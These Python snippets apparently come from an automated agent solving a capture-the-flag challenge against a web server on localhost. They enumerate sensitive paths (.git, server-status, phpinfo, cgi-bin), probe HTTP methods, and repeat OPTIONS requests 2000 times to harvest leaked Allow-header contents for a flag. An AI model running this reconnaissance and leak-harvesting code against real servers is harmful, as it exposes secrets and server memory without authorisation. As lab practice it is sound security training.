import urllib.request, urllib.error

base = 'http://localhost:80'
paths = [
    '/', '/index.html', '/index.php', '/icons/', '/server-status', '/robots.txt', '/flag', '/flag.txt', '/.git/HEAD', '/assets/', '/static/', '/images/', '/img/', '/css/', '/js/', '/uploads/', '/download/', '/files/', '/public/', '/.well-known/security.txt', '/debug', '/phpinfo.php', '/info.php', '/cgi-bin/', '/cgi-bin/printenv'
]

for path in paths:
    url = base + path
    req = urllib.request.Request(url, headers={'User-Agent':'ctf-agent'})
    try:
        with urllib.request.urlopen(req, timeout=3) as resp:
            code = resp.getcode()
            print(path, code)
    except urllib.error.HTTPError as e:
        print(path, e.code)
    except Exception as e:
        print(path, 'ERR', str(e))

import urllib.request, urllib.error

url = 'http://localhost:80/'
for method in ['OPTIONS','BOGUS','GET']:
    req = urllib.request.Request(url, method=method, headers={'User-Agent':'ctf-agent'})
    try:
        with urllib.request.urlopen(req, timeout=3) as resp:
            print(method, resp.status, resp.headers.get('Allow'))
    except urllib.error.HTTPError as e:
        print(method, e.code, e.headers.get('Allow'))

import urllib.request, time, random, string

url = 'http://127.0.0.1:80/icons/'
allows = {}
flag = None
for i in range(2000):
    host = 'localhost'
    headers={'User-Agent':'ctf-agent','Host':host}
    req = urllib.request.Request(url, method='OPTIONS', headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=2) as resp:
            allow = resp.headers.get('Allow','').strip()
            allows[allow] = allows.get(allow,0)+1
            if 'FLAG' in allow or 'CTF' in allow or '{' in allow:
                flag=allow
                break
    except Exception:
        pass

print('UNIQUE', len(allows))
for k,v in list(allows.items())[:10]:
    print(v, k)
print('FLAG', flag)
